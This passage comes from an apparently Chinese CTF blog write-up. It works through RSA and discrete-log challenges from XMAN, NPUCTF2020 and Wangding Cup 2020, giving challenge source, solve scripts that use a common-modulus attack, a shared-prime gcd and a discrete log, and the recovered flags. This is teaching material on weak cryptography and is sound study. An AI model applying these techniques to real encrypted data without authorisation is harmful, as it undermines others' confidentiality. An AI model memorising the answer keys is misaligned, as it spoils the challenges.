class="token keyword">import</span> is_prime<span class="token keyword">from</span> os <span class="token keyword">import</span> urandom<span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">bytes_to_num</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">num_to_bytes</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    b <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    b <span class="token operator">=</span> <span class="token string">'0'</span> <span class="token operator">+</span> b <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token keyword">else</span> b    <span class="token keyword">return</span> b<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_a_prime</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>    random_seed <span class="token operator">=</span> urandom<span class="token punctuation">(</span>l<span class="token punctuation">)</span>    num <span class="token operator">=</span> bytes_to_num<span class="token punctuation">(</span>random_seed<span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> is_prime<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    num <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> num<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> bytes_to_num<span class="token punctuation">(</span>s<span class="token punctuation">)</span>    p <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">return</span> num_to_bytes<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">separate</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> n <span class="token operator">%</span> <span class="token number">4</span>    t <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">*</span> p<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span>    <span class="token keyword">return</span> t <span class="token operator">==</span> <span class="token number">1</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>msg1 <span class="token operator">=</span> <span class="token string">""</span>msg2 <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> separate<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>        msg2 <span class="token operator">+=</span> flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        msg1 <span class="token operator">+=</span> flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span>p1 <span class="token operator">=</span> get_a_prime<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> get_a_prime<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>p3 <span class="token operator">=</span> get_a_prime<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>n1 <span class="token operator">=</span> p1 <span class="token operator">*</span> p2n2 <span class="token operator">=</span> p1 <span class="token operator">*</span> p3e <span class="token operator">=</span> <span class="token number">0x1001</span>c1 <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>msg1<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n1<span class="token punctuation">)</span>c2 <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>msg2<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c2<span class="token punctuation">)</span>e1 <span class="token operator">=</span> <span class="token number">0x1001</span>e2 <span class="token operator">=</span> <span class="token number">0x101</span>p4 <span class="token operator">=</span> get_a_prime<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>p5 <span class="token operator">=</span> get_a_prime<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>n3 <span class="token operator">=</span> p4 <span class="token operator">*</span> p5c1 <span class="token operator">=</span> num_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>n1<span class="token punctuation">,</span> e1<span class="token punctuation">,</span> n3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>c2 <span class="token operator">=</span> num_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>n1<span class="token punctuation">,</span> e2<span class="token punctuation">,</span> n3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>num_to_bytes<span class="token punctuation">(</span>n2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>num_to_bytes<span class="token punctuation">(</span>n3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后就是分析了，脚本很简单，先共模攻击获得n1，然后n2也可以有了，然后有msg1、msg2，然后根据他的分离的判定条件将两部分msg合并一下就行了。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes<span class="token punctuation">,</span> bytes_to_long<span class="token triple-quoted-string string">"""def bytes_to_num(b):    return int(b.encode('hex'), 16)def num_to_bytes(n):    b = hex(n)[2:-1]    b = '0' + b if len(b) % 2 == 1 else b    return b.decode('hex')def get_a_prime(l):    random_seed = urandom(l)    num = bytes_to_num(random_seed)    while True:        if is_prime(num):            break    num += 1    return numdef encrypt(s, e, n):    p = bytes_to_num(s)    p = pow(p, e, n)    return num_to_bytes(p).encode('hex')def separate(n):    p = n % 4    t = (p * p) % 4    return t == 1f = open('flag.txt', 'r')flag = f.read()msg1 = ""msg2 = ""for i in range(len(flag)):    if separate(i):        msg2 += flag[i]    else:        msg1 += flag[i]p1 = get_a_prime(128)p2 = get_a_prime(128)p3 = get_a_prime(128)n1 = p1 * p2n2 = p1 * p3e = 0x1001c1 = encrypt(msg1, e, n1)c2 = encrypt(msg2, e, n2)print(c1)print(c2)# 下面的对n1加密，使用相同的n3，不同的e，可以使用共模攻击来打。e1 = 0x1001e2 = 0x101p4 = get_a_prime(128)p5 = get_a_prime(128)n3 = p4 * p5c1 = num_to_bytes(pow(n1, e1, n3)).encode('hex')c2 = num_to_bytes(pow(n1, e2, n3)).encode('hex')print(c1)print(c2)print(base64.b64encode(num_to_bytes(n2)))print(base64.b64encode(num_to_bytes(n3)))"""</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'n2&amp;n3'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    n2 <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    n3 <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'n1.encrypted'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    c1 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'0x'</span> <span class="token operator">+</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    c2 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'0x'</span> <span class="token operator">+</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>e <span class="token operator">=</span> <span class="token number">0x1001</span>e1 <span class="token operator">=</span> <span class="token number">0x1001</span>e2 <span class="token operator">=</span> <span class="token number">0x101</span>n <span class="token operator">=</span> n3<span class="token keyword">def</span> <span class="token function">ext_euclid</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> b <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> a    <span class="token keyword">else</span><span class="token punctuation">:</span>        x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> q <span class="token operator">=</span> ext_euclid<span class="token punctuation">(</span>b<span class="token punctuation">,</span> a <span class="token operator">%</span> b<span class="token punctuation">)</span>  <span class="token comment"># q = gcd(a, b) = gcd(b, a%b)</span>        x<span class="token punctuation">,</span> y <span class="token operator">=</span> y<span class="token punctuation">,</span> <span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token punctuation">(</span>a <span class="token operator">//</span> b<span class="token punctuation">)</span> <span class="token operator">*</span> y<span class="token punctuation">)</span>        <span class="token keyword">return</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> q<span class="token keyword">def</span> <span class="token function">same_mod</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> e1<span class="token punctuation">,</span> e2<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> c2<span class="token punctuation">)</span><span class="token punctuation">:</span>    s<span class="token punctuation">,</span> t<span class="token punctuation">,</span> q <span class="token operator">=</span> ext_euclid<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span>    n1 <span class="token operator">=</span> <span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> s<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> t<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> n  <span class="token comment"># powmod进行大数运算</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'n1 ='</span><span class="token punctuation">,</span> n1<span class="token punctuation">)</span>    <span class="token keyword">return</span> n1n1 <span class="token operator">=</span> same_mod<span class="token punctuation">(</span>n<span class="token punctuation">,</span> e1<span class="token punctuation">,</span> e2<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> c2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'n2 ='</span><span class="token punctuation">,</span> n2<span class="token punctuation">)</span>p1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>n1<span class="token punctuation">,</span> n2<span class="token punctuation">)</span>p2 <span class="token operator">=</span> n1 <span class="token operator">//</span> p1p3 <span class="token operator">=</span> n2 <span class="token operator">//</span> p1phi1 <span class="token operator">=</span> <span class="token punctuation">(</span>p1<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>p2<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>phi2 <span class="token operator">=</span> <span class="token punctuation">(</span>p1<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>p3<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi1<span class="token punctuation">)</span>d2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi2<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'ciphertext'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    c1 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'0x'</span> <span class="token operator">+</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    c2 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'0x'</span> <span class="token operator">+</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>msg1 <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> d1<span class="token punctuation">,</span> n1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> d1<span class="token punctuation">,</span> n1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">3</span><span class="token punctuation">]</span>msg2 <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c2<span class="token punctuation">,</span> d2<span class="token punctuation">,</span> n2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c2<span class="token punctuation">,</span> d2<span class="token punctuation">,</span> n2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">separate</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> n <span class="token operator">%</span> <span class="token number">4</span>    t <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">*</span> p<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span>    <span class="token keyword">return</span> t <span class="token operator">==</span> <span class="token number">1</span>flag <span class="token operator">=</span> <span class="token string">''</span>f1 <span class="token operator">=</span> <span class="token number">0</span>f2 <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>msg1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>msg2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> separate<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> msg2<span class="token punctuation">[</span>f2<span class="token punctuation">]</span>        f2 <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> msg1<span class="token punctuation">[</span>f1<span class="token punctuation">]</span>        f1 <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># XMAN&#123;CRYPT0_I5_50_Interestingvim rsa.py&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="NPUCTF2020-认清形势，建立信心"><a href="#NPUCTF2020-认清形势，建立信心" class="headerlink" title="[NPUCTF2020]认清形势，建立信心"></a>[NPUCTF2020]认清形势，建立信心</h4><p>给出的题目的脚本为</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> secret <span class="token keyword">import</span> flagp <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span>e <span class="token operator">=</span> <span class="token comment"># Hidden</span>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p <span class="token operator">*</span> qm <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">b"npuctf&#123;"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">b"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''169169912654178128509160179202518818742414340358553002064450'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据第二、三、四的内容可以很简单地求得<code>n</code>、<code>e</code>，解题脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> sympy<span class="token triple-quoted-string string">"""p = getPrime(25)e = # Hiddenq = getPrime(25)n = p * qm = bytes_to_long(flag.strip(b"npuctf&#123;").strip(b"&#125;"))c = pow(m, e, n)print(c)print(pow(2, e, n))print(pow(4, e, n))print(pow(8, e, n))"""</span>c <span class="token operator">=</span> <span class="token number">169169912654178</span>c2 <span class="token operator">=</span> <span class="token number">128509160179202</span>c4 <span class="token operator">=</span> <span class="token number">518818742414340</span>c8 <span class="token operator">=</span> <span class="token number">358553002064450</span>n <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>c2<span class="token operator">*</span>c4 <span class="token operator">-</span> c8<span class="token punctuation">,</span> c2 <span class="token operator">**</span> <span class="token number">2</span> <span class="token operator">-</span> c4<span class="token punctuation">)</span><span class="token comment"># 1054494004042394&lt;16> = 2 · 18195301 · 28977097</span>p <span class="token operator">=</span> <span class="token number">28977097</span>q <span class="token operator">=</span> <span class="token number">18195301</span>n <span class="token operator">=</span> p<span class="token operator">*</span>qphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> <span class="token number">1</span>e <span class="token operator">=</span> sympy<span class="token punctuation">.</span>discrete_log<span class="token punctuation">(</span>n<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""808723997b'345y!'npuctf&#123;345y!&#125;"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>求e可以使用离散对数问题的求解获得。</p><h2 id="离散对数问题"><a href="#离散对数问题" class="headerlink" title="离散对数问题"></a>离散对数问题</h2><blockquote><p>基于离散对数问题的困难问题构造的密码，离散对数问题既是高中时的log问题，幂的逆问题。</p></blockquote><h3 id="一般离散对数问题"><a href="#一般离散对数问题" class="headerlink" title="一般离散对数问题"></a>一般离散对数问题</h3><h4 id="网鼎杯-2020-青龙组-you-raise-me-up"><a href="#网鼎杯-2020-青龙组-you-raise-me-up" class="headerlink" title="[网鼎杯 2020 青龙组]you_raise_me_up"></a>[网鼎杯 2020 青龙组]you_raise_me_up</h4><p>给出的脚本为</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> randomn <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">512</span>m <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'m = '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'c = '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token comment"># m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span><span class="token comment"># c = 6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>m是取的随机数，但是最后给出来了，那这个问题就落在了下面的这条语句上面了</p><pre class="line-numbers language-none"><code class="language-none">c &#x3D; pow(m, bytes_to_long(flag), n)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>既</p><script type="math/tex; mode=display">c = m ^ {flag}\quad mod \quad{n} \\也可以当做\\m ^ {flag} = c\quad mod \quad{n}</script><p>此时欲求得flag，sympy是有专门的函数的，这个函数的用法是<code>flag = sympy.discrete_log(n, c, m)</code>，如此即可求得flag。</p><p>故写解题脚本如下所示</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> sympyn <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">512</span>m <span class="token operator">=</span> <span class="token number">391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span>c <span class="token operator">=</span> <span class="token number">6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span>flag <span class="token operator">=</span> sympy<span class="token punctuation">.</span>discrete_log<span class="token punctuation">(</span>n<span class="token punctuation">,</span> c<span 